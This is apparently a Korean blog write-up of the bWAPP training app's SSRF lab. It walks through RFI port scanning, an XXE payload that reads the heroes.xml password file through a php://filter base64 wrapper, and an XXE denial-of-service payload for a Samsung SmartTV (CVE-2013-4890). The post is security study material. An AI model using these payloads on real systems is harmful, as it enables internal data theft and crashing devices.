---
layout: single
title: (bWAPP)Server Side Request Forgery (SSRF)
categories: bwapp
tag: [ssrf, bwapp, bee box, OWASP TOP 10, OWASP]
toc: true
author_profile: false
---

# 취약점 설명
> SSRF는 클라이언트측의 입력값을 위조시켜 위조된 HTTP 요청을 보내, 일반적으로 외부에서 접근이 불가능한 서버 내부망에 접근(Access) 하여, 데이터 유출 및 서버의 기밀성, 가용성, 무결성을 파괴한다. SSRF 의 경우 CSRF 공격과 유사하지만, 공격이 이루어지는 부분이 클라이언트측이냐 서버측이냐의 차이점이 존재한다.

![그림 1-1](/assets/image/bwapp/Missing%20Functional%20Level%20Access%20Control/Server%20Side%20Request%20Forgery%20(SSRF)/image.png)
- 해당 서버를 프록시 서버로 사용하여 3가지의 시나리오가 존재한다.

# 1. Port scan hosts on the internal network using RFI.
RFI 시나리오에서 내부 네트워크의 호스트를 포트스캔 할 수 있다고 한다.

```
<div id="main">

    <h1>Server Side Request Forgery (SSRF)</h1>

    <p>Server Side Request Forgery, or SSRF, is all about bypassing access controls such as firewalls.</p>
    
    <p>Use this web server as a proxy to:</p>
    
    <ul>
        
    <p>1. <a href="../evil/ssrf-1.txt" target="_blank">Port scan</a> hosts on the internal network using RFI.</p>
    
    <p>2. <a href="../evil/ssrf-2.txt" target="_blank">Access</a> resources on the internal network using XXE.</p>
    
    <p>3. <a href="../evil/ssrf-3.txt" target="_blank">Crash</a> my Samsung SmartTV (CVE-2013-4890) using XXE :)</p>
    
    </ul>
    
</div>
```

- 해당 시나리오에서 주어지는 소스코드이다. 포트 스캔을 확인하기 위해 웹루트 디렉터리에서 ../EVIL/SSRF-1.TXT를 읽어야한다.

![그림 1-2](/assets/image/bwapp/Missing%20Functional%20Level%20Access%20Control/Server%20Side%20Request%20Forgery%20(SSRF)/image-1.png)
- 위와 같이 스크립트가 실행된다.

![그림 1-3](/assets/image/bwapp/Missing%20Functional%20Level%20Access%20Control/Server%20Side%20Request%20Forgery%20(SSRF)/image-2.png)
- 포트 스캔 결과도 확인할 수 있다.

# 2. Access resources on the internal network using XXE.

XXE 취약점을 사용하여 ssrf-2.txt에 접근해야한다.
![그림 1-4](/assets/image/bwapp/Missing%20Functional%20Level%20Access%20Control/Server%20Side%20Request%20Forgery%20(SSRF)/image-3.png)
- xml 시나리오에서 진행 했다.

우선 주어진 소스코드를 확인해보면

```
# Accesses a file on the internal network (1)

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
 <!ENTITY bWAPP SYSTEM "http://localhost/bWAPP/robots.txt">
]>
<reset><login>&bWAPP;</login><secret>blah</secret></reset>


# Accesses a file on the internal network (2)
# Web pages returns some characters that break the XML schema > use the PHP base64 encoder filter to return an XML schema friendly version of the page!

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
 <!ENTITY bWAPP SYSTEM "php://filter/read=convert.base64-encode/resource=http://localhost/bWAPP/passwords/heroes.xml">
]>
<reset><login>&bWAPP;</login><secret>blah</secret></reset>
```

와 같이 알려준다.
즉, php 필터를 이용하여 로컬 시스템 내에 존재하는 패스워드 파일 중 heroes.xml 파일을 base64 인코딩 값으로 출력 시킨다.
이를 복호화 하게 되면, 해당 값을 얻을 수 있다.

![그림 1-5](/assets/image/bwapp/Missing%20Functional%20Level%20Access%20Control/Server%20Side%20Request%20Forgery%20(SSRF)/image-4.png)

# 3. Crash my Samsung SmartTV (CVE-2013-4890) using XXE :)

CVE 2013 4890으로 명명된 공개취약점을 이용한 공격이다.
<br> 주어진 소스코드를 보게되면

```
# Crashes my Samsung SmartTV (CVE-2013-4890) ;)

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
 <!ENTITY bWAPP SYSTEM "http://[IP]:5600/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
]>
<reset><login>&bWAPP;</login><secret>blah</secret></reset>
```

로컬 시스템에서 서비스중인 5600포트에 대해 DoS 공격을 시도하는 공격이다.


